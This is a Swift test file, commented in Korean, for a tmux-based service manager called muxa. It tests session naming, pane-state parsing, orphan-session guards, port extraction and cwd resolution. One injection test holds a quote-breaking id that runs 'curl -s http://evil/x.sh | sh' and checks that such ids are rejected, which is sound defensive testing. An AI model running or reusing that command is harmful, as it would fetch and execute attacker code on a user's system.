import Foundation
import Testing
@testable import muxa

/// 서비스(장수 프로세스) 순수 로직 — tmux 출력 파싱·세션명 규약·고아 판정·포트 추출.
/// 부작용(tmux 셸아웃)은 TmuxService 경계에 있고, 여기서는 순수 함수만 검증한다.
struct ServiceTests {
    // MARK: 세션명 규약 — muxa__<projectId>__<serviceId>

    @Test func testSessionNameRoundTrip() {
        let name = ServiceSession.name(projectId: "P1", serviceId: "S1")
        #expect(name == "muxa__P1__S1")
        let parsed = ServiceSession.parse(name ?? "")
        #expect(parsed?.projectId == "P1")
        #expect(parsed?.serviceId == "S1")
    }

    // MARK: 워크스페이스 스코프 그룹핑 — 팝오버가 현재/타 워크스페이스를 가른다

    @Test func testGroupByWorkspacePutsCurrentFirst() {
        func loc(_ id: String, ws: String, proj: String) -> LocatedService {
            LocatedService(service: Service(id: id, name: id, command: "c"),
                           workspaceId: ws, workspaceName: ws.uppercased(),
                           projectId: proj, projectName: proj, cwd: nil)
        }
        // 선언 순서로는 w2가 먼저 나오지만, 현재(w1)가 맨 앞으로 와야 한다.
        let items = [loc("a", ws: "w2", proj: "p2"), loc("b", ws: "w1", proj: "p1")]
        let scopes = groupByWorkspace(items, currentWorkspaceId: "w1", currentProjectId: "p1")
        #expect(scopes.map(\.workspaceId) == ["w1", "w2"]) // 현재 먼저
        #expect(scopes.first?.isCurrent == true)
        #expect(scopes.last?.isCurrent == false)
        #expect(scopes.first?.workspaceName == "W1")
        #expect(scopes.first?.groups.first?.services.first?.id == "b")
    }

    /// UUID(하이픈 포함, 언더스코어 없음)를 써도 왕복이 깨지지 않는다.
    @Test func testSessionNameRoundTripWithUUID() {
        let pid = "3F2504E0-4F89-11D3-9A0C-0305E82C3301"
        let sid = "A1B2C3D4-0000-1111-2222-333344445555"
        let parsed = ServiceSession.parse(ServiceSession.name(projectId: pid, serviceId: sid) ?? "")
        #expect(parsed?.projectId == pid)
        #expect(parsed?.serviceId == sid)
    }

    /// muxa 소유가 아닌 세션은 파싱을 거부한다 — 남의 세션을 건드리지 않기 위한 1차 방어선.
    @Test func testForeignSessionIsRejected() {
        #expect(ServiceSession.parse("my-work") == nil)
        #expect(ServiceSession.parse("muxa") == nil)
        #expect(ServiceSession.parse("muxa__onlyproject") == nil)
        #expect(ServiceSession.parse("notmuxa__P__S") == nil)
    }

    // MARK: list-panes 출력 파싱 — 상태의 진실 원천(서피스 렌더 불필요)

    @Test func testParsePanesRunningAndDead() {
        // 실측 포맷: '#{session_name}|#{pane_index}|#{pane_dead}|#{pane_dead_status}'
        let raw = """
        muxa__P__web|0|0|
        muxa__P__api|0|1|1
        """
        let states = ServiceSession.parsePanes(raw)
        #expect(states["muxa__P__web"] == .running)
        #expect(states["muxa__P__api"] == .exited(code: 1))
    }

    @Test func testParsePanesNormalExitIsZero() {
        #expect(ServiceSession.parsePanes("muxa__P__job|0|1|0")["muxa__P__job"] == .exited(code: 0))
    }

    /// dead=1 인데 status가 비어 있으면(신호 종료 등) 코드를 모른다 — -1로 두되 exited로는 확정한다.
    @Test func testParsePanesDeadWithoutStatus() {
        #expect(ServiceSession.parsePanes("muxa__P__x|0|1|")["muxa__P__x"] == .exited(code: -1))
    }

    @Test func testParsePanesIgnoresGarbage() {
        let raw = """

        garbage line without pipes
        muxa__P__web|0|0|
        |0|0|
        """
        let states = ServiceSession.parsePanes(raw)
        #expect(states.count == 1)
        #expect(states["muxa__P__web"] == .running)
    }

    @Test func testParsePanesEmpty() {
        #expect(ServiceSession.parsePanes("").isEmpty)
    }

    // MARK: 실행 폴더 해석 — service.cwd ?? project.path ?? ws.path (한 규칙을 모두가 공유)

    /// 서비스 자체 cwd가 있으면 그것, 없으면 프로젝트 경로, 그것도 없으면 워크스페이스 경로.
    /// 모노레포의 하위 패키지(`apps/admin`)에서 돌 서비스가 프로젝트 루트에 얼어붙지 않게 한다.
    @Test func testLocatedServiceCwdResolutionChain() {
        let ws = Workspace(id: "w", path: "/repo", name: "repo",
                           projects: [Project(id: "p1", name: "메인", path: nil,
                                              services: [Service(id: "a", name: "a", command: "c"),
                                                         Service(id: "b", name: "b", command: "c",
                                                                 cwd: "/repo/apps/admin")]),
                                      Project(id: "p2", name: "워크트리", path: "/wt/feat",
                                              services: [Service(id: "d", name: "d", command: "c")])],
                           activeProjectId: "p1")
        let located = collectAllServices(in: [ws])
        #expect(located.first { $0.id == "a" }?.cwd == "/repo") // 상속: ws.path
        #expect(located.first { $0.id == "b" }?.cwd == "/repo/apps/admin") // 지정이 이긴다
        #expect(located.first { $0.id == "d" }?.cwd == "/wt/feat") // 상속: project.path
    }

    // MARK: 시트 입력 → 저장할 override (순수) — 기본값과 같으면 nil(상속 유지)

    /// 빈 입력·기본값과 같은 입력은 nil — 같은 값을 저장해두면 프로젝트 경로가 바뀔 때
    /// (워크트리 이동 등) 서비스만 옛 경로에 얼어붙는다. 지정은 "다를 때만" 저장한다.
    @Test func testRunCwdOverrideInheritsWhenSameAsDefault() {
        #expect(runCwdOverride(entered: "", defaultCwd: "/repo", home: "/Users/u") == nil)
        #expect(runCwdOverride(entered: "  ", defaultCwd: "/repo", home: "/Users/u") == nil)
        #expect(runCwdOverride(entered: "/repo", defaultCwd: "/repo", home: "/Users/u") == nil)
        #expect(runCwdOverride(entered: "/repo/", defaultCwd: "/repo", home: "/Users/u") == nil) // 뒤 슬래시 무시
    }

    @Test func testRunCwdOverrideStoresDifferentPath() {
        #expect(runCwdOverride(entered: "/repo/apps/admin", defaultCwd: "/repo", home: "/Users/u") == "/repo/apps/admin")
        // 기본값이 없어도(경로 미지정 프로젝트) 입력이 있으면 저장한다.
        #expect(runCwdOverride(entered: "/repo", defaultCwd: nil, home: "/Users/u") == "/repo")
    }

    /// `~`는 홈으로 편다 — tmux `new-session -c`는 셸을 안 거치므로 틸드를 모른다.
    @Test func testRunCwdOverrideExpandsTilde() {
        #expect(runCwdOverride(entered: "~/proj", defaultCwd: "/repo", home: "/Users/u") == "/Users/u/proj")
        #expect(runCwdOverride(entered: "~/repo", defaultCwd: "/Users/u/repo", home: "/Users/u") == nil)
    }

    /// 상대 경로는 **기본값(프로젝트 경로) 기준**으로 편다 — 모노레포에서 가장 자연스러운 입력이
    /// `apps/admin`이다. 안 펴면 존재 검증이 앱 프로세스 cwd 기준으로 돌아 항상 실패한다.
    @Test func testRunCwdOverrideResolvesRelativeAgainstDefault() {
        #expect(runCwdOverride(entered: "apps/admin", defaultCwd: "/repo", home: "/Users/u") == "/repo/apps/admin")
        #expect(runCwdOverride(entered: "./apps/admin", defaultCwd: "/repo", home: "/Users/u") == "/repo/./apps/admin") // FileManager·tmux 둘 다 `.` 세그먼트를 이해한다
        // 기본값이 없으면 기준이 없다 — 입력 그대로 두고 존재 검증이 걸러낸다(지어내지 않는다).
        #expect(runCwdOverride(entered: "apps/admin", defaultCwd: nil, home: "/Users/u") == "apps/admin")
    }

    // MARK: 고아 판정 — 좀비 tmux 세션 정리 (ScrollbackStore.orphans 와 같은 원칙: 의심되면 안 지운다)

    @Test func testOrphanIsUnregisteredServiceOfAKnownProject() {
        let orphans = ServiceSession.orphans(sessions: ["muxa__P__web", "muxa__P__ghost"],
                                             liveServiceIds: ["web"], knownProjectIds: ["P"])
        #expect(orphans == ["muxa__P__ghost"])
    }

    /// muxa 소유가 아닌 세션은 절대 고아로 보지 않는다 — 사용자의 다른 tmux 작업을 죽이면 안 된다.
    @Test func testForeignSessionIsNeverOrphan() {
        let orphans = ServiceSession.orphans(sessions: ["my-work", "irssi", "muxa__P__web"],
                                             liveServiceIds: ["web"], knownProjectIds: ["P"])
        #expect(orphans.isEmpty)
    }

    /// **모르는 프로젝트의 세션은 건드리지 않는다.** muxa 인스턴스가 여럿 떠 있으면(창 여러 개·개발용
    /// 워크트리 빌드) 같은 tmux 소켓을 공유하므로, 내 state에 없는 프로젝트의 세션은 남의 것이다.
    /// 이 가드가 없으면 서로의 dev 서버를 몰살한다.
    @Test func testUnknownProjectSessionIsNeverOrphan() {
        let orphans = ServiceSession.orphans(sessions: ["muxa__OTHER__svc", "muxa__P__ghost"],
                                             liveServiceIds: [], knownProjectIds: ["P"])
        #expect(orphans == ["muxa__P__ghost"])
    }

    /// **아는 프로젝트가 하나도 없으면 아무것도 안 지운다.** 아직 state를 못 읽었거나 서비스를 안 쓰는
    /// 인스턴스가 "등록이 0개니 전부 고아"라고 판단해 남의 세션을 쓸어버리는 것을 막는다.
    /// (ScrollbackStore.orphans의 "의심되면 안 지운다"와 같은 원칙.)
    @Test func testNoKnownProjectsDeletesNothing() {
        let orphans = ServiceSession.orphans(sessions: ["muxa__P__a", "muxa__P__b"],
                                             liveServiceIds: [], knownProjectIds: [])
        #expect(orphans.isEmpty)
    }

    /// 아는 프로젝트인데 등록된 서비스가 0개면, 그 프로젝트의 세션은 정말 고아다(사용자가 전부 지웠다).
    @Test func testKnownProjectWithNoServicesYieldsOrphans() {
        let orphans = ServiceSession.orphans(sessions: ["muxa__P__a", "muxa__P__b"],
                                             liveServiceIds: [], knownProjectIds: ["P"])
        #expect(Set(orphans) == ["muxa__P__a", "muxa__P__b"])
    }

    // MARK: 포트 추출 — 칩에 ':3000'을 띄우기 위한 최소 매칭. 못 뽑으면 nil(이름만 표시).

    @Test func testExtractPortFromViteOutput() {
        let log = """
        [vite] starting...
          ➜  Local:   http://localhost:3000/
        [vite] ready in 320 ms
        """
        #expect(ServiceSession.extractPort(log) == 3000)
    }

    @Test func testExtractPortFromBindAddresses() {
        #expect(ServiceSession.extractPort("Listening on 127.0.0.1:8080") == 8080)
        #expect(ServiceSession.extractPort("bound to 0.0.0.0:5432") == 5432)
    }

    /// 가장 최근(마지막) 매치를 쓴다 — 재시작 시 옛 포트가 아니라 지금 포트를 보여줘야 한다.
    @Test func testExtractPortUsesLastMatch() {
        let log = """
        http://localhost:3000/
        Port in use, retrying...
        http://localhost:3001/
        """
        #expect(ServiceSession.extractPort(log) == 3001)
    }

    /// 시각(16:27:38)을 포트로 오인하지 않는다 — 호스트가 앞에 붙은 경우만 인정한다(오탐 방지).
    @Test func testTimestampIsNotAPort() {
        #expect(ServiceSession.extractPort("Pane is dead (status 1, Mon Jul 13 16:27:38 2026)") == nil)
        #expect(ServiceSession.extractPort("[vite] ready in 320 ms") == nil)
    }

    @Test func testExtractPortNoneWhenAbsent() {
        #expect(ServiceSession.extractPort("") == nil)
        #expect(ServiceSession.extractPort("compiling...") == nil)
    }

    // MARK: attach 명령 — 유일하게 '셸을 거쳐' 실행되는 명령이라 인용이 필요하다

    /// zsh의 `=word`(EQUALS 확장)에 당하지 않도록 타겟이 인용돼야 한다.
    /// 인용이 빠지면 zsh가 세션 이름을 명령 경로로 치환하려다 `not found`로 죽는다 —
    /// 도크가 로그를 아예 못 여는 치명적 버그였다.
    @Test func testAttachCommandQuotesTarget() {
        let cmd = TmuxService.attachCommand(projectId: "P", serviceId: "S") ?? ""
        #expect(cmd.contains("'=muxa__P__S'"), "타겟이 인용되지 않았다: \(cmd)")
        #expect(!(cmd.contains(" =muxa")), "인용 안 된 '=' 가 셸에 노출됐다: \(cmd)")
    }

    /// **id는 신뢰 경계 밖이다**(state.v4.json은 사용자·외부가 쓴다). 따옴표가 든 id로 세션명을 만들면
    /// attach 명령(유일하게 셸을 거치는 경로)에서 따옴표가 조기에 닫혀 임의 명령이 실행된다 —
    /// 도크를 펼치는 순간에. 이름 자체를 만들지 않는다.
    @Test func testInjectionIdYieldsNoSessionName() {
        let evil = "a'; curl -s http://evil/x.sh | sh; :'"
        #expect(ServiceSession.name(projectId: "P", serviceId: evil) == nil)
        #expect(ServiceSession.name(projectId: evil, serviceId: "S") == nil)
        #expect(TmuxService.attachCommand(projectId: "P", serviceId: evil) == nil)
    }

    /// `__`가 든 id는 parse가 4토막이라 nil을 내는데 세션은 만들어져, 상태도 고아 정리도 못 하는
    /// **조용한 좀비**가 된다. 이름 단계에서 막는다.
    @Test func testUnderscorePairIdYieldsNoSessionName() {
        #expect(ServiceSession.name(projectId: "P", serviceId: "we__b") == nil)
        #expect(ServiceSession.parse("muxa__P__we__b") == nil) // 만들어졌다면 파싱도 안 됐을 것이다
    }

    @Test func testValidIdWhitelist() {
        #expect(ServiceSession.isValidId("3F2504E0-4F89-11D3-9A0C-0305E82C3301"))
        #expect(ServiceSession.isValidId("web1"))
        #expect(!(ServiceSession.isValidId("")))
        #expect(!(ServiceSession.isValidId("web dev"))) // 공백
        #expect(!(ServiceSession.isValidId("web_dev"))) // 언더스코어
        #expect(!(ServiceSession.isValidId("웹")))       // 비ASCII
    }

    // MARK: 세션의 첫(최소 인덱스) pane이 서비스 상태다 — attach해서 화면을 나눠도, base-index가 뭐든 안 흔들린다

    /// 사용자가 도크에서 attach해 pane을 나누면 한 세션에 pane이 여럿 잡힌다(서비스 pane + 더 높은 인덱스의 셸).
    /// 최소 인덱스(서비스 pane)를 써야 **죽은 서비스가 옆 셸 때문에 살아 있다고 보이지 않는다.**
    @Test func testParsePanesUsesLowestPane() {
        let raw = """
        muxa__P__web|0|1|1
        muxa__P__web|1|0|
        """
        #expect(ServiceSession.parsePanes(raw)["muxa__P__web"] == .exited(code: 1))
    }

    /// `~/.tmux.conf`의 `pane-base-index 1`이면 세션의 유일한 pane이 인덱스 1이다. 0만 인정하던 옛 코드는
    /// 이걸 놓쳐 **실행 중 서비스를 통째로 `.missing`으로 오판**했다(헤더에 [시작] 버튼·재실행 없음).
    @Test func testParsePanesHandlesNonZeroBaseIndex() {
        #expect(ServiceSession.parsePanes("muxa__P__web|1|0|")["muxa__P__web"] == .running)
        #expect(ServiceSession.parsePanes("muxa__P__api|1|1|2")["muxa__P__api"] == .exited(code: 2))
    }

    // MARK: 살아있는 서비스 id 수집 — 고아 정리의 입력. 여기가 틀리면 멀쩡한 dev 서버를 죽인다.

    @Test func testLiveServiceIdsSpanAllWorkspacesAndProjects() {
        let p1 = Project(id: "P1", name: "a", path: nil,
                         services: [Service(id: "S1", name: "web", command: "pnpm dev")])
        let p2 = Project(id: "P2", name: "b", path: nil,
                         services: [Service(id: "S2", name: "api", command: "go run .")])
        let ws1 = Workspace(id: "W1", path: nil, name: "w1", projects: [p1], activeProjectId: "P1")
        let ws2 = Workspace(id: "W2", path: nil, name: "w2", projects: [p2], activeProjectId: "P2")
        // 활성이 아닌 워크스페이스·프로젝트의 서비스도 반드시 '살아있음'으로 쳐야 한다
        // (안 그러면 다른 워크스페이스를 보는 동안 그 서비스가 고아로 몰려 죽는다).
        #expect(collectLiveServiceIds(in: [ws1, ws2]) == ["S1", "S2"])
    }

    @Test func testLiveServiceIdsEmptyWhenNoServices() {
        let p = Project(id: "P", name: "a", path: nil)
        let ws = Workspace(id: "W", path: nil, name: "w", projects: [p], activeProjectId: "P")
        #expect(collectLiveServiceIds(in: [ws]).isEmpty)
    }

    // MARK: 전역 목록 — "어디에 뭐가 떠 있나"를 프로젝트를 옮겨 다니지 않고 한눈에

    /// 서비스는 프로젝트에 속하지만, 사용자는 **창 전체에서 뭐가 도는지**를 알아야 한다.
    /// 각 서비스에 소속(워크스페이스·프로젝트)을 붙여 한 목록으로 편다.
    @Test func testCollectAllServicesCarriesLocation() {
        let p1 = Project(id: "P1", name: "웹", path: nil,
                         services: [Service(id: "S1", name: "web", command: "pnpm dev")])
        let p2 = Project(id: "P2", name: "API", path: nil,
                         services: [Service(id: "S2", name: "api", command: "go run ."),
                                    Service(id: "S3", name: "db", command: "docker compose up")])
        let ws1 = Workspace(id: "W1", path: nil, name: "front", projects: [p1], activeProjectId: "P1")
        let ws2 = Workspace(id: "W2", path: nil, name: "back", projects: [p2], activeProjectId: "P2")

        let all = collectAllServices(in: [ws1, ws2])
        #expect(all.map(\.service.name) == ["web", "api", "db"])

        let api = all.first { $0.service.id == "S2" }
        #expect(api?.workspaceId == "W2")
        #expect(api?.workspaceName == "back")
        #expect(api?.projectId == "P2")
        #expect(api?.projectName == "API")
    }

    @Test func testCollectAllServicesEmpty() {
        let p = Project(id: "P", name: "a", path: nil)
        let ws = Workspace(id: "W", path: nil, name: "w", projects: [p], activeProjectId: "P")
        #expect(collectAllServices(in: [ws]).isEmpty)
    }

    // MARK: 죽은 서비스의 로그 정리 — tmux는 pane 화면 그대로를 준다(빈 줄 밭 포함)

    /// 로그 두 줄과 사인(Pane is dead) 사이에 빈 줄 스무 개가 끼면, 정작 봐야 할 것이 화면 밖으로 나간다.
    @Test func testTidyCollapsesBlankRunsBetweenLogAndCause() {
        let raw = """
        ➜ Local: http://localhost:4321/
        ready in 320 ms


        \n\n
        Pane is dead (status 0)

        """
        #expect(ServiceLogView.tidy(raw) == """
        ➜ Local: http://localhost:4321/
        ready in 320 ms

        Pane is dead (status 0)
        """)
    }

    @Test func testTidyStripsTrailingSpacesOnEachLine() {
        #expect(ServiceLogView.tidy("Error: EADDRINUSE   \n  at Server   ") == "Error: EADDRINUSE\n  at Server")
    }

    @Test func testTidyEmpty() {
        #expect(ServiceLogView.tidy("\n\n   \n") == "")
    }

    // MARK: 영속 — 서비스는 Project에 실려 Persisted에 자동 편승한다

    @Test func testProjectServicesRoundTrip() throws {
        let p = Project(id: "P", name: "a", path: "/repo",
                        services: [Service(id: "S", name: "web", command: "pnpm dev")])
        let data = try JSONEncoder().encode(p)
        let back = try JSONDecoder().decode(Project.self, from: data)
        #expect(back.services == [Service(id: "S", name: "web", command: "pnpm dev")])
    }

    /// 서비스 필드가 없던 옛 저장분도 그대로 열려야 한다(하위호환) — sessionBaseHead와 같은 원칙.
    @Test func testOldProjectJSONWithoutServicesDecodes() throws {
        let old = #"{"id":"P","name":"메인"}"#.data(using: .utf8)!
        let p = try JSONDecoder().decode(Project.self, from: old)
        #expect(p.services == nil)
        #expect(p.id == "P")
    }
}
